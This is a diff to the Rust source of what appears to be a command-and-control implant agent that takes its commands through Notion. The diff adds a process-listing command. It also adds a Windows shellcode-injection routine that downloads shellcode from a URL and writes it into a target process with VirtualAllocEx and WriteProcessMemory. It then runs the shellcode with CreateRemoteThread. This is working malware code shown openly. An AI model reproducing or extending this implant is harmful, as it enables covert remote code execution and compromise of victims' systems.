@@ -1,17 +1,23 @@
+#[cfg(windows)] extern crate winapi;
+#[cfg(windows)] extern crate kernel32;
 use std::error::Error;
 use std::result::Result;
 use std::io::copy;
 use std::fmt;
+use std::ptr;
 use std::path::Path;
 use std::fs::File;
 use std::env::{set_current_dir, current_dir};
 use std::process::Command;
 use reqwest::{Client};
 
+#[cfg(windows)]  use winapi::um::winnt::{PROCESS_ALL_ACCESS,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE};
+
 pub enum CommandType {
     Cd(String),
     Shell(String),
     Download(String),
+    Ps,
     Inject(String),
     Shutdown,
     Unknown
@@ -48,6 +54,7 @@ impl NotionCommand {
                 "shell"    => CommandType::Shell(command_string),
                 "cd"       => CommandType::Cd(command_string),
                 "download" => CommandType::Download(command_string),
+                "ps"       => CommandType::Ps,
                 "inject"   => CommandType::Inject(command_string),
                 "shutdown" => CommandType::Shutdown,
                 _          => CommandType::Unknown
@@ -110,7 +117,66 @@ impl NotionCommand {
                 }
                 return Ok(r.text().await?);
             },
-            CommandType::Inject(_) => {
+            CommandType::Ps => {
+                // This is a lame kludge because getting process data is tough, but at least
+                // it's ergonomic?
+                let output = if cfg!(target_os = "windows") {
+                    Command::new("cmd")
+                        .args(["/c", "tasklist"])
+                        .output()
+                        .expect("failed to execute process")
+                } else {
+                    Command::new("sh")
+                        .arg("-c")
+                        .args(["ps", "aux"])
+                        .output()
+                        .expect("failed to execute process")
+                };
+                let output_string: String;
+                if output.stderr.len() > 0 {
+                    output_string = String::from_utf8(output.stderr).unwrap();
+                } else {
+                    output_string = String::from_utf8(output.stdout).unwrap();
+                }
+                return Ok(output_string);
+            },
+            CommandType::Inject(s) => {
+                // Input: url to shellcode -p pid
+                #[cfg(windows)] {
+                    let mut args = s.split("-p");
+                    // Get URL as the first arg
+                    let url = args.nth(0).unwrap();
+                    // Get path as the 2nd arg or the last part of the URL
+                    if let Some(p) = args.nth(0) {
+                        let pid: u32 = p.parse()?;
+                        let client = Client::new();
+                        let r = client.get(s).send().await?;
+                        if r.status().is_success() {
+                            // Here comes the injection
+                            let shellcode = r.bytes().await?;
+                            // Big thanks to trickster0
+                            // https://github.com/trickster0/OffensiveRust/tree/master/Process_Injection_CreateThread
+                            unsafe {
+                                let mut h = kernel32::OpenProcess(PROCESS_ALL_ACCESS, winapi::shared::ntdef::FALSE.into(), pid);
+                                let mut addr = kernel32::VirtualAllocEx(h,ptr::null_mut(),shellcode.len() as u64,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
+                                let mut n = 0;
+                                kernel32::WriteProcessMemory(h,addr,shellcode.as_ptr() as  _, shellcode.len() as u64,&mut n);
+                                let mut hThread = kernel32::CreateRemoteThread(h,ptr::null_mut(),0,Some(std::mem::transmute(addr)), ptr::null_mut(), 0,ptr::null_mut());
+                                kernel32::CloseHandle(h);
+                            }
+                            return Ok("Injection completed!".to_string());
+                        }
+                        
+                    } else {
+                        return Ok("No valid pid provided".to_string());
+                    }
+                    
+                }
+                #[cfg(not(windows))] {
+                    return Ok("Can only inject shellcode on Windows!".to_string());
+                }
+
+
                 return Ok(String::from("Not yet implemented!"));
             },
             CommandType::Shutdown => {
